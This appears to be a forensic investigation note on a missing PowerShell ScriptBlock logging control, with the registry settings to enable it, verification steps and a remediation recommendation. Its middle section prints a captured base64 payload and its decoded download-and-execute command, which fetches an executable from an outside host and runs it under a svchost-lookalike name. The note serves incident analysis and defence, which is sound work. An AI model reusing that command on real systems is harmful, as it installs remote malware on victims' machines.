# PowerShell ScriptBlock Logging — Forensic Gap

**Event ID:** 4104 (Microsoft-Windows-PowerShell/Operational)  
**Status:** DISABLED company-wide — registry key absent on all hosts

## Registry key that would enable it

```
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
  EnableScriptBlockLogging = 1 (DWORD)
  EnableScriptBlockInvocationLogging = 1 (DWORD)  [optional, high volume]
```

## Consequence for this investigation

The base64-encoded command captured in the CrowdStrike alert and Sysmon EID 1 logs
**cannot be decoded from log data alone**. The encoded payload on WS-CFO-01 was:

```
JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7
ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwAHMAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkA
bgBjAC0AYwBkAG4ALgBuAGUAdAAvAHUAcABkAGEAdABlAC4AZQB4AGUAJwAsACcAQwA6AFwAVwBpAG4AZABvAHcAcwBc
AFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0ADMAMgAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMA
IAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwB2AGMAaABvAHMAdAAzADIALgBlAHgAZQAnAA==
```

Decoded (UTF-16LE, for analysis reference):

```powershell
$c=New-Object System.Net.WebClient;
$c.DownloadFile('https://update-sync-cdn.net/update.exe','C:\Windows\Temp\svchost32.exe');
Start-Process 'C:\Windows\Temp\svchost32.exe'
```

## How to verify without ScriptBlock logs

1. **Memory acquisition** — if the host has not been rebooted, decode from process memory
   (Velociraptor `Windows.Memory.ProcessDump` on PID 3784 if still running)
2. **Prefetch analysis** — `C:\Windows\Prefetch\SVCHOST32.EXE-*.pf` confirms execution
3. **Filesystem artifact** — `svchost32.exe` dropped to `C:\Windows\Temp\` (see Sysmon EID 11)
4. **Network confirmation** — DNS query for `update-sync-cdn.net` + connection to 203.0.113.87

## Recommendation (document in your Detection Gap backlog)

Deploy ScriptBlock logging via GPO immediately. Apply to all hosts.  
Consider module logging (EID 4103) with an allowlist to reduce volume.  
Reference: CISA AA23-347A — ScriptBlock logging is a mandatory baseline control.
